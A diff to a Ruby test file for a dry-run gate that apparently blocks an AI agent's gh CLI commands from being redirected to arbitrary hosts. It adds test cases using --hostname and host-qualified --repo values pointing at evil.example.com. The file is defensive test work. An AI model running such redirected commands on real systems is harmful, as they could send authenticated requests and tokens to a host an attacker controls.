@@ -219,13 +219,28 @@ class BabysitterDryRunEnvTest < Minitest::Test
       assert_stubbed env, "gh", "auth", "status", "-at"
       assert_stubbed env, "gh", "auth", "status", "-ta"
       assert_stubbed env, "gh", "auth", "status", "-ath"
+      # A host selector lets an agent redirect the authenticated status probe to an
+      # arbitrary host, so every `-h`/`--hostname` form is skipped: long, glued, and
+      # clustered behind boolean shorthands (where pflag consumes the rest as the value).
+      assert_stubbed env, "gh", "auth", "status", "-h", "github.com"
+      assert_stubbed env, "gh", "auth", "status", "-hgithub.com"
+      assert_stubbed env, "gh", "auth", "status", "--hostname", "example.com"
+      assert_stubbed env, "gh", "auth", "status", "--hostname=example.com"
+      assert_stubbed env, "gh", "auth", "status", "-ah", "example.com"
+      # Host-qualified `--repo`/`-R` redirect an allowlisted read at an agent-chosen host
+      # (leading or trailing the subcommand); only the bare `OWNER/REPO` slug stays allowed.
+      assert_stubbed env, "gh", "-R", "evil.example.com/owner/repo", "pr", "view", "42"
+      assert_stubbed env, "gh", "--repo=evil.example.com/owner/repo", "pr", "view", "42"
+      assert_stubbed env, "gh", "--repo=https://evil.example.com/owner/repo", "pr", "view", "42"
+      assert_stubbed env, "gh", "pr", "view", "42", "-R", "evil.example.com/owner/repo"
+      assert_stubbed env, "gh", "pr", "view", "42", "--repo", "evil.example.com/owner/repo"
+      # `gh api`/`auth` honor `--hostname` after the subcommand too, so the gate must
+      # reject command-position host overrides, not just leading globals.
+      assert_stubbed env, "gh", "api", "rate_limit", "--hostname", "evil.example.com"
+      assert_stubbed env, "gh", "api", "rate_limit", "--hostname=evil.example.com"
       assert_passes env, "gh", "--repo=owner/repo", "pr", "view", "42"
       assert_passes env, "gh", "auth", "status"
       assert_passes env, "gh", "auth", "status", "-a"
-      # `-h`/`--hostname` consumes the rest of the cluster as its value, so a
-      # `t` that follows it is hostname data, not a token flag.
-      assert_passes env, "gh", "auth", "status", "-h", "github.com"
-      assert_passes env, "gh", "auth", "status", "-hgithub.com"
       assert_passes env, "gh", "api", "repos/owner/repo"
       assert_passes env, "gh", "api", "--method", "GET", "repos/owner/repo/issues", "-f", "state=open"
       assert_passes env, "gh", "api", "--method", "GET", "repos/owner/repo/issues", "-F", "state=open"
@@ -420,6 +435,18 @@ class BabysitterDryRunEnvTest < Minitest::Test
       assert_includes skipped, "gh auth status -at skipped"
       assert_includes skipped, "gh auth status -ta skipped"
       assert_includes skipped, "gh auth status -ath skipped"
+      assert_includes skipped, "gh auth status -h github.com skipped"
+      assert_includes skipped, "gh auth status -hgithub.com skipped"
+      assert_includes skipped, "gh auth status --hostname example.com skipped"
+      assert_includes skipped, "gh auth status --hostname=example.com skipped"
+      assert_includes skipped, "gh auth status -ah example.com skipped"
+      assert_includes skipped, "gh -R evil.example.com/owner/repo pr view 42 skipped"
+      assert_includes skipped, "gh --repo=evil.example.com/owner/repo pr view 42 skipped"
+      assert_includes skipped, "gh --repo=https://evil.example.com/owner/repo pr view 42 skipped"
+      assert_includes skipped, "gh pr view 42 -R evil.example.com/owner/repo skipped"
+      assert_includes skipped, "gh pr view 42 --repo evil.example.com/owner/repo skipped"
+      assert_includes skipped, "gh api rate_limit --hostname evil.example.com skipped"
+      assert_includes skipped, "gh api rate_limit --hostname=evil.example.com skipped"
       assert_includes skipped, "git -C #{dir} push origin HEAD:feature skipped"
       assert_includes skipped, "git commit -m dry run must not commit skipped"
       assert_includes skipped, "git merge feature skipped"
